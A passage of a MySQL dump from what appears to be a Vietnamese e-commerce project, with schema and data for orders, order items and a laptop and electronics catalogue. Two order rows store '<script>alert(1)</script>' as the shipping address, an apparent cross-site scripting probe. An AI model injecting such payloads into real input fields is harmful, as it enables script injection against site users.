) ENGINE=InnoDB AUTO_INCREMENT=196 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `line_item`
--

LOCK TABLES `line_item` WRITE;
/*!40000 ALTER TABLE `line_item` DISABLE KEYS */;
INSERT INTO `line_item` VALUES (4,35990000,1,NULL,23,3,NULL),(5,35990000,1,NULL,23,1,NULL),(21,45500000,1,NULL,22,9,NULL),(41,35990000,1,NULL,23,13,NULL),(79,55000000,1,NULL,28,19,NULL),(80,28990000,1,NULL,21,19,NULL),(81,35990000,1,NULL,23,19,NULL),(90,45500000,1,NULL,22,20,NULL),(134,7389000,1,NULL,31,25,NULL),(154,25999000,1,NULL,42,29,NULL),(155,33990000,1,NULL,50,29,NULL),(156,2490000,1,NULL,39,29,NULL),(163,45500000,1,NULL,22,12,NULL),(164,28990000,1,NULL,21,12,NULL),(175,35990000,1,NULL,23,34,NULL),(178,45500000,1,NULL,22,4,NULL),(185,28990000,1,NULL,21,38,NULL),(186,45500000,1,NULL,22,38,NULL),(187,35990000,1,NULL,23,38,NULL),(188,49900000,1,NULL,24,38,NULL);
/*!40000 ALTER TABLE `line_item` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `order_item`
--

DROP TABLE IF EXISTS `order_item`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `order_item` (
  `id` int NOT NULL AUTO_INCREMENT,
  `quantity` int NOT NULL,
  `order_id` int DEFAULT NULL,
  `product_id` bigint DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `FKt4dc2r9nbvbujrljv3e23iibt` (`order_id`),
  KEY `FK551losx9j75ss5d6bfsqvijna` (`product_id`),
  CONSTRAINT `FK551losx9j75ss5d6bfsqvijna` FOREIGN KEY (`product_id`) REFERENCES `product` (`id`),
  CONSTRAINT `FKt4dc2r9nbvbujrljv3e23iibt` FOREIGN KEY (`order_id`) REFERENCES `orders` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=158 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `order_item`
--

LOCK TABLES `order_item` WRITE;
/*!40000 ALTER TABLE `order_item` DISABLE KEYS */;
INSERT INTO `order_item` VALUES (11,2,8,23),(12,1,9,22),(13,1,10,23),(15,1,12,22),(17,2,14,23),(18,1,15,23),(19,1,16,23),(20,1,17,23),(21,1,18,22),(22,1,19,22),(23,1,20,23),(24,1,21,23),(25,1,21,22),(26,1,22,23),(27,1,22,31),(28,1,22,32),(29,1,22,40),(30,1,22,21),(31,1,23,23),(32,1,24,22),(34,1,26,22),(35,1,27,22),(36,1,28,29),(41,1,32,28),(42,1,33,23),(43,1,33,24),(44,1,33,21),(45,1,34,23),(54,1,42,28),(55,1,43,23),(59,1,47,28),(60,1,48,21),(61,1,48,22),(63,1,50,26),(65,1,52,30),(66,1,53,22),(67,1,54,21),(68,1,55,31),(69,1,56,22),(70,1,57,23),(71,1,57,24),(72,1,57,27),(73,18,58,28),(74,16,58,21),(75,24,58,23),(76,18,59,28),(77,16,59,21),(78,9,59,23),(79,1,60,28),(80,1,60,21),(81,1,60,23),(82,1,61,21),(83,1,62,27),(84,1,63,22),(85,3,64,23),(86,1,64,22),(87,1,64,29),(88,1,64,26),(89,1,65,22),(90,1,66,23),(91,1,67,23),(92,1,67,22),(93,1,68,23),(94,1,69,22),(95,1,70,23),(96,1,71,23),(97,1,72,28),(98,1,73,23),(99,1,74,23),(100,1,75,24),(101,1,75,23),(102,1,76,23),(103,1,77,22),(104,1,77,27),(105,1,77,28),(106,1,78,22),(107,1,78,27),(108,1,78,28),(109,1,79,31),(110,1,80,23),(111,1,80,24),(112,1,81,24),(113,1,82,28),(114,1,82,22),(115,1,83,24),(116,1,84,21),(117,1,85,23),(118,1,86,23),(119,2,86,21),(120,1,87,23),(121,1,87,22),(122,1,88,23),(123,1,89,23),(124,1,90,27),(125,1,90,21),(126,1,90,22),(127,1,91,23),(128,5,92,28),(129,5,93,28),(130,4,94,28),(131,5,94,28),(132,1,95,23),(133,1,96,22),(134,1,97,22),(135,1,98,23),(136,1,99,23),(137,1,100,23),(140,1,103,21),(143,1,106,23),(144,1,106,22),(145,1,107,22),(146,1,108,22),(147,1,109,24),(148,1,110,24),(149,1,111,21),(150,1,112,23),(151,1,113,24),(152,1,114,21),(153,1,115,22),(154,1,116,21),(155,1,117,27),(156,1,118,23),(157,1,118,24);
/*!40000 ALTER TABLE `order_item` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `orders`
--

DROP TABLE IF EXISTS `orders`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `orders` (
  `id` int NOT NULL AUTO_INCREMENT,
  `dateOrder` datetime(6) DEFAULT NULL,
  `paymentMethod` varchar(255) DEFAULT NULL,
  `shippingAddress` varchar(255) DEFAULT NULL,
  `status` int NOT NULL,
  `user_id` bigint DEFAULT NULL,
  `coupon_code` varchar(255) DEFAULT NULL,
  `discount_amount` double DEFAULT NULL,
  `final_amount` double DEFAULT NULL,
  `subtotal` double DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `FKhp7n1lf3m1igeo0mtmx8x8m0d` (`user_id`),
  CONSTRAINT `FKhp7n1lf3m1igeo0mtmx8x8m0d` FOREIGN KEY (`user_id`) REFERENCES `account` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=119 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `orders`
--

LOCK TABLES `orders` WRITE;
/*!40000 ALTER TABLE `orders` DISABLE KEYS */;
INSERT INTO `orders` VALUES (8,'2025-10-14 12:12:30.845000','COD','trường đại học sư phạm kĩ thuật',0,4,'HUY',200000,71780000,71980000),(9,'2025-10-14 12:19:31.121000','COD','Thanh Xuân',0,4,'HUY',200000,45300000,45500000),(10,'2025-10-14 12:27:56.353000','COD','hihi',0,4,'HUY',200000,35790000,35990000),(12,'2025-10-14 12:33:02.626000','COD','hhuhu',0,4,NULL,0,45500000,45500000),(14,'2025-10-14 12:42:27.730000','COD','trường sư phạm kĩ thuật',0,4,'HUY',200000,71780000,71980000),(15,'2025-10-14 12:53:09.946000','COD','kkk',0,4,NULL,0,35990000,35990000),(16,'2025-10-14 13:08:18.407000','COD','232132131',0,4,NULL,0,35990000,35990000),(17,'2025-10-14 13:18:34.914000','COD','aaaaaaaa',0,4,'KHANGDZ',50000,35940000,35990000),(18,'2025-10-14 13:35:38.619000','COD','aaa',0,4,NULL,0,45500000,45500000),(19,'2025-10-14 13:35:51.104000','VNPAY','âsassa',0,4,NULL,0,45500000,45500000),(20,'2025-10-14 13:57:24.855000','VNPAY','sdasdasdas',0,4,NULL,0,35990000,35990000),(21,'2025-10-14 13:59:06.729000','VNPAY','200/7 LÊ VĂN VIỆT',0,4,'KHANGDZ',50000,81440000,81490000),(22,'2025-10-14 14:05:12.608000','VNPAY','hoang dep trai',3,4,NULL,0,64981247,64981247),(23,'2025-10-14 14:23:31.942000','VNPAY','Biên Hòa',1,9,NULL,0,35990000,35990000),(24,'2025-10-14 14:28:08.855000','COD','aaaaaaaa',0,9,'KHANGDZ',50000,45450000,45500000),(26,'2025-10-14 14:29:33.366000','VNPAY','ấdsadas',-1,9,NULL,0,45500000,45500000),(27,'2025-10-14 14:32:09.155000','VNPAY','ấdsadas',-1,9,NULL,0,45500000,45500000),(28,'2025-10-14 16:00:27.027000','VNPAY','dsadsadsa',-1,4,NULL,0,32900000,32900000),(32,'2025-10-14 18:17:45.087000','VNPAY','TAN PHU',-1,2,'HUY',200000,54800000,55000000),(33,'2025-10-14 18:20:22.621000','COD','Nguyen Viet Khai',0,2,'HUY',200000,114680000,114880000),(34,'2025-10-14 18:22:36.130000','VNPAY','Nguyen Viet Khai',-1,2,NULL,0,35990000,35990000),(42,'2025-10-14 23:44:48.107000','VNPAY','123 Lê Lợi',0,11,NULL,0,55000000,55000000),(43,'2025-10-15 00:43:00.872000','VNPAY','123 Lê Lợi',0,11,NULL,0,35990000,35990000),(47,'2025-10-15 03:12:25.369000','VNPAY','123 Lê Lợi',0,11,NULL,0,55000000,55000000),(48,'2025-10-15 03:14:42.958000','COD','123 Lê Lợi',0,11,NULL,0,74490000,74490000),(50,'2025-10-15 03:44:02.482000','VNPAY','123 Lê Lợi',0,11,NULL,0,23500000,23500000),(52,'2025-10-15 04:25:17.840000','COD','123 Lê Lợi',0,13,'HOANGDZ',100000000,0,21990000),(53,'2025-10-15 04:26:35.063000','COD','123 Lê Lợi',3,13,'KHANGDZ',50000,45450000,45500000),(54,'2025-10-15 05:17:37.766000','COD','123 Lê Lợi',0,11,'KHANG',14495000,14495000,28990000),(55,'2025-10-15 05:29:00.474000','COD','99 con co bu sieu to khong lo',0,15,NULL,0,899,899),(56,'2025-10-15 06:24:31.995000','COD','123 Lê Lợi',3,11,NULL,0,45500000,45500000),(57,'2025-10-15 06:30:07.099000','COD','Huyênandnsnadsa',0,19,'KHANG',57845000,57845000,115690000),(58,'2025-10-15 06:31:20.102000','VNPAY','huy',-1,19,'KHANG',1158800000,1158800000,2317600000),(59,'2025-10-15 06:32:12.930000','VNPAY','huyaaaa',-1,19,'KHANG',888875000,888875000,1777750000),(60,'2025-10-15 06:33:36.833000','VNPAY','dsadsadas',3,19,'KHANG',59990000,59990000,119980000),(61,'2025-10-15 06:36:50.208000','COD','123 Lê Lợi',3,11,'KHANG',14495000,14495000,28990000),(62,'2025-10-15 07:06:13.104000','COD','123 Lê Lợi',0,20,NULL,0,29800000,29800000),(63,'2025-10-15 08:28:39.662000','COD','Opal RiverSide đường số 10, phường Hiệp Bình, Thủ Đức',0,12,NULL,0,45500000,45500000),(64,'2025-10-15 08:57:45.822000','COD','nhà huân',0,4,'KHANG',104935000,104935000,209870000),(65,'2025-10-15 08:58:27.668000','COD','123 Lê Lợi',0,11,NULL,0,45500000,45500000),(66,'2025-10-15 09:03:59.304000','COD','dsdsadas',0,4,NULL,0,35990000,35990000),(67,'2025-10-15 09:07:57.211000','COD','xóm 7 thôn 3 gia huynh tánh linh bình thuận, BÌnh Thuận',0,4,'KHANG',40745000,40745000,81490000),(68,'2025-10-15 09:22:17.666000','COD','xóm 7 thôn 3 gia huynh tánh linh bình thuận, BÌnh Thuận',0,4,NULL,0,35990000,35990000),(69,'2025-10-15 09:22:46.405000','COD','...............jj',0,4,NULL,0,45500000,45500000),(70,'2025-10-15 09:27:02.181000','COD','',0,24,NULL,0,35990000,35990000),(71,'2025-10-15 09:30:48.524000','COD','',0,24,NULL,0,35990000,35990000),(72,'2025-10-15 09:34:16.900000','COD','',0,24,NULL,0,55000000,55000000),(73,'2025-10-15 09:37:14.464000','COD','',0,24,NULL,0,35990000,35990000),(74,'2025-10-15 09:38:43.153000','COD','',0,24,NULL,0,35990000,35990000),(75,'2025-10-15 09:43:20.226000','COD','asdas, Ho Chi Minh City',0,23,'KHANG',42945000,42945000,85890000),(76,'2025-10-15 09:43:32.023000','COD','',0,24,NULL,0,35990000,35990000),(77,'2025-10-15 09:44:03.918000','VNPAY',NULL,-1,23,NULL,0,130300000,130300000),(78,'2025-10-15 09:47:19.244000','COD','asdas, Ho Chi Minh City',0,23,'KHANG',65150000,65150000,130300000),(79,'2025-10-15 10:25:26.283000','cod','Phú Yên',3,25,NULL,NULL,NULL,NULL),(80,'2025-10-15 11:23:36.337000','COD','TAN PHU, THU DUC',0,2,'HOANGSAIDEPCHIEU',79.97,85889920.03,85890000),(81,'2025-10-15 11:24:06.846000','VNPAY',NULL,3,2,NULL,0,49900000,49900000),(82,'2025-10-15 11:38:19.390000','cod','Phú Yên',3,8,NULL,NULL,NULL,NULL),(83,'2025-10-15 12:06:26.375000','COD','TAN PHU, THU DUC',0,2,'KHANG',24950000,24950000,49900000),(84,'2025-10-15 12:06:52.744000','COD','TAN PHU, THU DUC',3,2,NULL,0,28990000,28990000),(85,'2025-10-15 12:10:04.617000','cod','Phú Yên',3,8,NULL,NULL,NULL,NULL),(86,'2025-10-15 12:14:53.935000','cod','Phú Yên',3,8,NULL,NULL,NULL,NULL),(87,'2025-10-15 12:34:08.791000','COD','<script>alert(1)</script>',0,29,NULL,0,81490000,81490000),(88,'2025-10-15 12:34:59.963000','COD','<script>alert(1)</script>',0,29,NULL,0,35990000,35990000),(89,'2025-10-15 12:40:45.199000','COD','12321321',3,28,NULL,0,35990000,35990000),(90,'2025-10-15 13:41:19.969000','COD','TAN PHU, THU DUC',3,2,'SUPERSALE2025',52145000,52145000,104290000),(91,'2025-10-15 13:42:46.932000','COD','xóm 7 thôn 3 gia huynh tánh linh bình thuận, BÌnh Thuận',0,4,NULL,0,35990000,35990000),(92,'2025-10-15 13:45:42.646000','VNPAY',NULL,-1,4,NULL,0,275000000,275000000),(93,'2025-10-15 13:46:07.408000','VNPAY',NULL,-1,4,NULL,0,275000000,275000000),(94,'2025-10-15 13:46:37.373000','COD','biên hòa',0,4,NULL,0,495000000,495000000),(95,'2025-10-15 13:46:38.374000','VNPAY',NULL,-1,2,NULL,0,35990000,35990000),(96,'2025-10-15 13:47:05.680000','VNPAY',NULL,-1,4,NULL,0,45500000,45500000),(97,'2025-10-15 13:48:02.470000','COD','xóm 7 thôn 3 gia huynh tánh linh bình thuận, BÌnh Thuận',0,4,NULL,0,45500000,45500000),(98,'2025-10-15 13:49:50.874000','VNPAY',NULL,-1,4,NULL,0,35990000,35990000),(99,'2025-10-15 13:55:03.713000','VNPAY',NULL,-1,4,NULL,0,35990000,35990000),(100,'2025-10-15 14:21:19.198000','VNPAY',NULL,-1,4,NULL,0,35990000,35990000),(103,'2025-10-15 14:26:00.168000','COD','jmj',4,31,NULL,0,28990000,28990000),(106,'2025-10-15 14:39:44.875000','COD','xóm 7 thôn 3 gia huynh tánh linh bình thuận, BÌnh Thuận',0,4,NULL,0,81490000,81490000),(107,'2025-10-15 14:39:55.212000','COD','ađasa',0,4,NULL,0,45500000,45500000),(108,'2025-10-15 14:40:03.988000','VNPAY',NULL,-1,4,NULL,0,45500000,45500000),(109,'2025-10-15 16:00:47.248000','VNPAY',NULL,-1,4,NULL,0,49900000,49900000),(110,'2025-10-15 16:01:04.419000','COD','xóm 7 thôn 3 gia huynh tánh linh bình thuận, BÌnh Thuận',0,4,NULL,0,49900000,49900000),(111,'2025-10-15 16:33:21.931000','COD','TAN PHU, THU DUC',0,33,NULL,0,28990000,28990000),(112,'2025-10-15 17:21:34.042000','COD','127/9a hoàng diệu 2 thủ đưcc',0,34,NULL,0,35990000,35990000),(113,'2025-10-15 18:52:15.962000','VNPAY',NULL,-1,2,NULL,0,49900000,49900000),(114,'2025-10-15 19:04:01.055000','COD','TAN PHU, THU DUC',0,35,NULL,0,28990000,28990000),(115,'2025-10-15 22:19:19.461000','COD','123 Lê Lợi',0,36,NULL,0,45500000,45500000),(116,'2025-10-16 00:40:11.092000','VNPAY',NULL,-1,4,NULL,0,28990000,28990000),(117,'2025-10-16 01:59:35.162000','VNPAY',NULL,-1,2,NULL,0,29800000,29800000),(118,'2025-11-22 21:03:27.266000','VNPAY',NULL,-1,136,NULL,0,85890000,85890000);
/*!40000 ALTER TABLE `orders` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `payment`
--

DROP TABLE IF EXISTS `payment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `payment` (
  `id` int NOT NULL AUTO_INCREMENT,
  `dateOrder` datetime(6) DEFAULT NULL,
  `paymentMethod` varchar(255) DEFAULT NULL,
  `status` int NOT NULL,
  `order_id` int DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UK_mf7n8wo2rwrxsd6f3t9ub2mep` (`order_id`),
  CONSTRAINT `FKlouu98csyullos9k25tbpk4va` FOREIGN KEY (`order_id`) REFERENCES `orders` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `payment`
--

LOCK TABLES `payment` WRITE;
/*!40000 ALTER TABLE `payment` DISABLE KEYS */;
/*!40000 ALTER TABLE `payment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `post_likes`
--

DROP TABLE IF EXISTS `post_likes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `post_likes` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `created_at` datetime(6) DEFAULT NULL,
  `post_id` bigint NOT NULL,
  `user_id` bigint NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UK5l2rj28vw5oj6f7ox746grokg` (`post_id`,`user_id`),
  KEY `FKkgau5n0nlewg6o9lr4yibqgxj` (`user_id`),
  CONSTRAINT `FKa5wxsgl4doibhbed9gm7ikie2` FOREIGN KEY (`post_id`) REFERENCES `posts` (`id`),
  CONSTRAINT `FKkgau5n0nlewg6o9lr4yibqgxj` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `post_likes`
--

LOCK TABLES `post_likes` WRITE;
/*!40000 ALTER TABLE `post_likes` DISABLE KEYS */;
/*!40000 ALTER TABLE `post_likes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `posts`
--

DROP TABLE IF EXISTS `posts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `posts` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `content` text NOT NULL,
  `created_at` datetime(6) DEFAULT NULL,
  `image_url` varchar(255) DEFAULT NULL,
  `updated_at` datetime(6) DEFAULT NULL,
  `user_id` bigint NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK5lidm6cqbc7u4xhqpxm898qme` (`user_id`),
  CONSTRAINT `FK5lidm6cqbc7u4xhqpxm898qme` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `posts`
--

LOCK TABLES `posts` WRITE;
/*!40000 ALTER TABLE `posts` DISABLE KEYS */;
/*!40000 ALTER TABLE `posts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `product`
--

DROP TABLE IF EXISTS `product`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `product` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `brand` varchar(255) DEFAULT NULL,
  `color` varchar(255) DEFAULT NULL,
  `description` text,
  `image` varchar(255) DEFAULT NULL,
  `name` varchar(255) DEFAULT NULL,
  `price` double NOT NULL,
  `quantity` int NOT NULL,
  `sold` int NOT NULL,
  `category_id` int DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `FK1mtsbur82frn64de7balymq9s` (`category_id`),
  CONSTRAINT `FK1mtsbur82frn64de7balymq9s` FOREIGN KEY (`category_id`) REFERENCES `category` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=51 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `product`
--

LOCK TABLES `product` WRITE;
/*!40000 ALTER TABLE `product` DISABLE KEYS */;
INSERT INTO `product` VALUES (21,'Apple','Space Gray','MacBook Air M2 2022 13.6 inch, siêu mỏng nhẹ, hiệu năng vượt trội với chip M2, màn hình Liquid Retina sắc nét.','https://product.hstatic.net/200000768357/product/silver_30e46f5c0bbd4e7c8992c4dcf0b2c4e6_master.png','MacBook Air M2 13.6 inch',28990000,996,99,3),(22,'Dell','Platinum Silver','Dell XPS 15 9530, laptop cao cấp cho dân sáng tạo. Màn hình InfinityEdge 4 cạnh viền siêu mỏng, hiệu năng mạnh mẽ.','https://macstores.vn/wp-content/uploads/2023/04/dell-xps-15-9530-1.jpg','Dell XPS 15 9530',45500000,995,12,2),(23,'HP','Nightfall Black','HP Spectre X360 14, laptop 2 trong 1 xoay gập 360 độ. Thiết kế viền cắt kim cương sang trọng, màn hình OLED rực rỡ.','https://onlylap.vn/wp-content/uploads/2024/01/HP-Spectre-x360-14-ea0023dx-1.webp','HP Spectre X360 14',35990000,997,123,2),(24,'Lenovo','Storm Grey','Lenovo ThinkPad X1 Carbon Gen 11, laptop doanh nhân siêu bền bỉ và nhẹ nhất thế giới. Bàn phím gõ cực sướng.','https://mac24h.vn/images/thumbnails/800/655/detailed/94/ThinkPad_X1_Carbon_Gen_11_qvx9-nb.png','Lenovo ThinkPad X1 Carbon Gen 11',49900000,999,90,2),(26,'Acer','Obsidian Black','Acer Nitro 5 Tiger, laptop gaming quốc dân. Tản nhiệt tốt, cấu hình mạnh trong tầm giá, chiến mọi loại game.','https://laptoptcc.com/media/product/45585-acer-nitro-5-tiger-an515-58-52sp-i5-nhqfhsv001-180222-043416-600x600.jpeg','Acer Nitro 5 Tiger AN515-58',23500000,1001,45,1),(27,'Microsoft','Platinum','Microsoft Surface Laptop 5, laptop Windows cao cấp. Thiết kế tối giản, sang trọng, trải nghiệm Windows gốc mượt mà.','https://newtechshop.vn/wp-content/uploads/2022/10/Surface-Laptop-5-i7-16GB-512GB-1-2.jpg','Microsoft Surface Laptop 5',29800000,999,222,2),(28,'Razer','Black','Razer Blade 15, laptop gaming cao cấp với thiết kế unibody nhôm nguyên khối, được mệnh danh là MacBook của thế giới game.','https://imagor.owtg.one/unsafe/fit-in/1280x720/https://d28jzcg6y4v9j1.cloudfront.net/backend/uploads/product/color_images/2020/8/20/Blade15_Base_2018_01.jpg','Razer Blade 15 Advanced',55000000,991,122,1),(29,'LG','Black','LG Gram 16, laptop 16 inch nhẹ nhất thế giới, chỉ khoảng 1.2kg. Pin siêu trâu, phù hợp cho người hay di chuyển.','https://lapvip.vn/upload/products/thumb_800x0/lg-5-1758686130.png','LG Gram 16 2023',32900000,1000,67,2),(30,'MSI','Core Black','MSI Katana GF66, laptop gaming tầm trung lấy cảm hứng từ thanh kiếm Katana. Bàn phím đèn nền đỏ đặc trưng.','https://phucngoc.vn/Data/images/Laptop_MSI_Katana_GF66_.jpg','MSI Katana GF66 12UC',21990000,1000,85,1),(31,'Sony','Black','Tai nghe chống ồn Sony WH-1000XM5 – Chống ồn chủ động, Bluetooth 5.2, pin 30h.','https://cdn.tgdd.vn/Products/Images/54/313692/tai-nghe-bluetooth-chup-tai-sony-wh1000xm5-trang-1-750x500.jpg','Sony WH-1000XM5',7389000,1000,99,4),(32,'JBL','Black','Loa Bluetooth JBL Charge 5 – chống nước IP67, âm bass mạnh, pin 20h.','https://vn.jbl.com/dw/image/v2/AAUJ_PRD/on/demandware.static/-/Sites-masterCatalog_Harman/default/dwe8501613/JBL_CHARGE5_HERO_GREEN_0025_x2.png?sw=537&sfrm=png','JBL Charge 5 Bluetooth Speaker',3917000,1000,12,4),(33,'Logitech','Gray','Chuột không dây Logitech MX Master 3S – Silent Click, DPI 8000, sạc USB-C.','https://product.hstatic.net/200000722513/product/aster-3s-mouse-top-side-view-graphite_82680b5eec1044b092b598b340d41570_6503d13adcab46aca3ca31927ab0c902_master.png','Logitech MX Master 3S',2335000,1000,20,5),(34,'Razer','Black','Bàn phím cơ Razer BlackWidow V4 Pro – Switch Green, đèn RGB Chroma, wrist rest.','https://owlgaming.vn/wp-content/uploads/2025/02/ban-phim-razer-blackwidow-v4-pro-75.jpg','Razer BlackWidow V4 Pro',5499000,1000,8,5),(35,'Samsung','Titanium Gray','Samsung Galaxy S24 Ultra – Snapdragon 8 Gen 3, 200MP, bút S-Pen, pin 5000mAh.','https://ntstore.com.vn/wp-content/uploads/2025/02/ntstore_samsung-galaxy-s24-ultra-xam-1-2.png','Samsung Galaxy S24 Ultra',17000000,1000,9,6),(36,'Apple','Blue','iPad Air 5 (2022) chip M1, 10.9 inch Liquid Retina, Touch ID, USB-C.','https://bachlongstore.vn/vnt_upload/product/11_2023/43543.jpg','iPad Air 5 M1 10.9\"',12999000,1000,7,6),(37,'Corsair','Black','RAM Corsair Vengeance DDR5 32GB (2x16GB) Bus 6000MHz – XMP 3.0, tản nhiệt nhôm.','https://product.hstatic.net/200000420363/product/6_255f748f9fd447ba929fdaf8411d7dd9_master.jpg','Corsair Vengeance DDR5 32GB (2x16GB) 6000MHz',4199000,1000,25,7),(38,'Samsung','Black','SSD Samsung 990 PRO 1TB NVMe PCIe 4.0 – tốc độ đọc 7450 MB/s, ghi 6900 MB/s.','https://lagihitech.vn/wp-content/uploads/2022/08/SSD-Samsung-990-Pro-1TB-M2-PCIe-Gen-5.0-MZ-V9P1T0-hinh-3.jpg','Samsung 990 PRO 1TB NVMe SSD',1000000,1000,15,7),(39,'Apple','White','Tai nghe không dây Apple AirPods Pro 2 với chip H2, chống ồn chủ động, sạc USB-C.','https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/MQD83_AV2?wid=572&hei=572&fmt=jpeg&qlt=95&.v=1660803972361','AirPods Pro 2 (USB-C)',2490000,1000,12,4),(40,'Logitech','Graphite','Webcam Logitech StreamCam – Full HD 1080p 60fps, mic kép, kết nối USB-C.','https://gtctelecom.vn/uploads/images/san-pham/tong-dai-ip/camera-hoi-nghi-logitech-brio.jpg','Logitech StreamCam',899000,1000,7,5),(41,'Apple','Blue Titanium','iPhone 15 Pro Max – chip A17 Pro, khung Titanium, camera 48MP, sạc USB-C.','https://tranphumobile.com/wp-content/uploads/2024/11/iphone-15-pro-vs-iphone-15-pro-max-256gb-512gb-1tb-mau-titan-xanh-duong.jpg','iPhone 15 Pro Max 256GB',17999000,1000,9,6),(42,'Apple','Gold Titanium','iPhone 16 Pro Max – chip A18 Pro, màn hình 6.9 inch Super Retina XDR, khung Titanium mới, camera 48MP, quay 8K.','https://cdn2.cellphones.com.vn/insecure/rs:fill:358:358/q:90/plain/https://cellphones.com.vn/media/catalog/product/i/p/iphone-16-pro-max.png','iPhone 16 Pro Max 256GB',25999000,1000,8,6),(43,'Apple','Silver','iPad Pro M4 2024 – chip Apple M4, màn hình Ultra Retina Tandem OLED, Face ID, USB-C Thunderbolt 4.','https://apple.ngocnguyen.vn/cdn/images/202406/goods_img/new-100-ipad-pro-13-inch-2024-m4-wifi-G15582-1717214887350.png','iPad Pro M4 13 inch (Wi-Fi 512GB)',31999000,1000,6,6),(44,'Samsung','Phantom Black','Điện thoại Samsung Galaxy S24 Ultra 5G – 200MP, Snapdragon 8 Gen 3','https://baotinmobile.vn/uploads/2024/02/s24-ultra-tim.jpg','Samsung Galaxy S24 Ultra 5G',31990000,1000,99,6),(45,'Samsung','Beige','Máy tính bảng Samsung Galaxy Tab S9 FE 10.9 inch, chip Exynos 1380','https://sieuthismartphone.vn/data/product/medium/medium_lcm1699859947.jpeg','Samsung Galaxy Tab S9 FE',13990000,1000,5,6),(46,'Samsung','Graphite','Tai nghe Bluetooth Samsung Galaxy Buds3 Pro – Chống ồn chủ động ANC','https://cuahangsamsung.vn/filemanager/userfiles/hinh-san-pham/buds-3/pro/2b.jpg','Samsung Galaxy Buds3 Pro',4990000,1000,1,4),(47,'Dell','Dark Gray','Laptop Dell Inspiron 14 7430 – Intel Core i7 13th Gen, RAM 16GB, SSD 512GB','https://tse3.mm.bing.net/th/id/OIP.UoujDsiw1n_w8pifEfF6-gHaFP?pid=Api&P=0&h=220','Dell Inspiron 14 7430',25990000,1000,3,2),(48,'Dell','Silver','Laptop Dell XPS 13 Plus 9320 – Core i7 Gen 13, OLED 13.4 inch, RAM 32GB','https://zshop.vn/images/thumbnails/1357/1000/detailed/142/Dell_XPS_13_Plus_9320__1__p0mf-yr.jpg','Dell XPS 13 Plus 9320',51990000,1000,45,2),(49,'Apple','Space Black','MacBook Pro 14 inch M3 Pro 2024 – 11-core CPU, 14-core GPU, RAM 18GB, SSD 512GB','https://product.hstatic.net/200000348419/product/macbook_pro_14_inch_m3-pro-black_5a67a95d906d49a79bf0ff37c4f9a175_master.png','MacBook Pro 14 inch M3 Pro 2024',52990000,1000,5,3),(50,'Apple','Silver','MacBook Air 15 inch M3 2024 – Chip Apple M3, 8GB RAM, 256GB SSD, màn Liquid Retina','https://bizweb.dktcdn.net/thumb/large/100/318/659/products/macbook-air-m3-10-xfnh-uh-jpeg-54039a3a-d221-4966-835a-bfb1897cb630.jpg?v=1712728034437','MacBook Air 15 inch M3 2024',33990000,1000,6,3);
/*!40000 ALTER TABLE `product` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `products`
--

DROP TABLE IF EXISTS `products`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `products` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `name` varchar(255) DEFAULT NULL,
  `price` double DEFAULT NULL,
  `category_id` bigint DEFAULT NULL,
  `image_url` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `FKog2rp4qthbtt2lfyhfo32lsw9` (`category_id`),
  CONSTRAINT `FKog2rp4qthbtt2lfyhfo32lsw9` FOREIGN KEY (`category_id`) REFERENCES `categories` (`id`)
